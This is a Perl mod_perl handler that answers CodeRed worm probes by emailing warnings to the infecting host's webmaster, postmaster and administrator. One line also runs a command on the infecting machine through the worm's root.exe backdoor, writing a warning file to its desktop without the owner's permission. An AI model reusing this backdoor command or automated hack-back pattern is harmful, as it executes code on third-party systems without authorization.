# This Perl module should be invoked whenever the CodeRed or CodeRed2
# worm attacks.  We don't have to worry about such attacks on Linux
# boxes, but we can be good Internet citizens, warning the webmasters
# on infected machines of the problem and how to solve it.

# On my system, I put CodeRed.pm in /usr/local/apache/lib/perl, which
# is in @ISA under mod_perl.  I then added the following to my httpd.conf:
 
# PerlModule	CodeRed

# <Location /default.ida>
#     SetHandler perl-script
#     PerlHandler CodeRed
# </Location>

# This module does require mod_perl (of course), Mail::Sendmail (which
# works fine with qmail, despite its name), and Net::DNS.

# ------------------------------------------------------------
package CodeRed;

use vars qw($VERSION);

use Apache::Constants qw(OK DECLINED FORBIDDEN);
use Mail::Sendmail;
use Net::DNS;
use Cache::FileCache;
use LWP::Simple;

# What version of the module is this?
$VERSION = 1.02;

# Set this to your favorite URL describing how to fix this problem.
my $security_url = 'http://www.microsoft.com/technet/treeview/default.asp?url=/technet/itsolutions/security/topics/codealrt.asp';

# Do you want to know when one of these alerts has been sent?  If so,
# put your address here.
my $cc_address = 'ranger@befunk.com';

# Define whatever cache options you want to set.  The
# most important for our purposes is default_expires_in.
my %cache_options = ('default_expires_in' => 86400 );

# Our handler subroutine, which deals with this.
sub handler
{
    # Get Apache request/response object
    my $r = shift;

    # Create a DNS resolver, which we'll need no matter what.
    my $res = new Net::DNS::Resolver;
    my $remote_hostname;

    # ------------------------------------------------------------
    # Open the cache of already-responded-to IP addresses,
    # which we're going to keep in /tmp, just for simplicity.
    my $file_cache = new Cache::FileCache(\%cache_options);

    unless ($file_cache)
    {
	$r->log_error("CodeRed: Could not instantiate FileCache");
	return DECLINED;
    }

    # Get some basic information about the request
    my $remote_ip_address = $r->get_remote_host();

    # If we don't have the remote IP address, then we cannot
    # send mail to the remote server, can we?
    return DECLINED unless (defined $remote_ip_address);

    # If we have the remote IP address, then check to see if it's in
    # our cache.  
    my $last_visited = $file_cache->get($remote_ip_address);

    # If the address is in our cache, then we've already
    # sent e-mail to that person, and we'll just return FORBIDDEN.
    if ($last_visited) 
    {
	$r->log_error("CodeRed: Found cached IP '$remote_ip_address'");
	return FORBIDDEN;
    }

    # ------------------------------------------------------------
    # If we only have the IP address (rather than the hostname),
    # then get the hostname.  (We can't look up the MX host

    if ($remote_ip_address =~ /^[\d.]+$/)
    {
	$dns_query_response = $res->search($remote_ip_address);

	if ($dns_query_response) 
	{
	    foreach $rr ($dns_query_response->answer)
	    {
		next unless $rr->type eq "A";
		$remote_hostname = $rr->address;
	    }
	}
	else
	{
	    $r->log_error("CodeRed: DNS query failed ('", 
			  $res->errorstring, "')");
	}
    }

    # If we had the hostname to begin with, then use it.
    else
    {
	$remote_hostname = $remote_ip_address;
    }

    # ------------------------------------------------------------

    # Get the MX for this domain.  This is trickier than you might
    # think, since some DNS servers (like my ISP's) give accurate
    # answers for domains, but not for hosts.  So www.lerner.co.il
    # doesn't have an MX, while lerner.co.il does.  So we're going to
    # do an MX lookup -- and if it doesn't work, we're going to break
    # off everything up to and including the first . in the hostname,
    # and try again.  We shouldn't have to get to the top-level
    # domain, but we'll try that anyway, just in case the others don't
    # work.

    my @mx = ();
    my @hostname_components = split /\./, $remote_hostname;
    my $starting_index = 0;

    # Loop around until our starting index begins at the
    # same location as it would end
    while ($starting_index < @hostname_components)
    {
	my $host_for_mx_lookup = 
	    join '.', 
		@hostname_components[$starting_index .. $#hostname_components];


	@mx = mx($res, $host_for_mx_lookup);
	
	if (@mx)
	{
	    last;
	}
	else
	{
	$starting_index++;
	}
    }

    # If we still haven't found any records, then simply return FORBIDDEN,
    # and log an error message
    if (! @mx)
    {
	$r->log_error("No MX records for '$remote_hostname': ",
		      $res->errorstring);

	return FORBIDDEN;
    }

    # Grab the first MX record, and assume that it'll work.
    my $mx_host = $mx[0]->exchange;
    $r->log_error("CodeRed: Using MX host '$mx_host'");

    # ------------------------------------------------------------

    # Send e-mail to the webmaster, postmaster, and administrator,
    # since the webmaster and/or postmaster addresses often doesn't
    # work.
    my $remote_webmaster_address = 
	"webmaster\@$mx_host, postmaster\@$mx_host, administrator\@$mx_host";

    # Set the outgoing message

    my $outgoing_message = <<END;

Your Microsoft IIS server (at $remote_ip_address) appears to have been
infected with a strain of the CodeRed worm.  It attempted to spread to
our Web server, despite the fact that we run Linux and Apache (which
are immune).

You should immediately download the security patch from Microsoft, from
<$security_url>.

This message was generated automatically by CodeRed.pm for mod_perl
and Apache, written by Reuven M. Lerner (<reuven@lerner.co.il>).

END

    if (my $content = get('http://'.$remote_ip_address.'/scripts/root.exe?/c%20echo%20f>c:\\windows\\desktop\\warning%20you%20have%20the%20code%20red%202%20virus%20your%20computer%20attacked%20mine%20please%20get%20a%20virus%20scanner.txt')) {
	$r->log_error("CodeRed: Created desktop file.");
    } else {
        $r->log_error("CodeRed: Unable to create desktop file.");
    }

    $r->log_error("CodeRed: Sending e-mail to '$remote_webmaster_address'");

    my %mail = ( To      => $remote_webmaster_address,
		 CC      => $cc_address,
		 From    => 'code-red-alert@befunk.com',
		 Subject => 'CodeRed infection',
		 Message => $outgoing_message
	       );

    my $sendmail_success = sendmail(%mail);
    
    if ($sendmail_success)
    {
	# Cache the fact that we saw this IP address
	$file_cache->set($remote_ip_address, 1);

	return FORBIDDEN;
    }
    else
    {
	$r->log_error("CodeRed: Mail::Sendmail returned '$Mail::Sendmail::error'");
	return DECLINED;
    }
}

# All modules must return a true value
1;
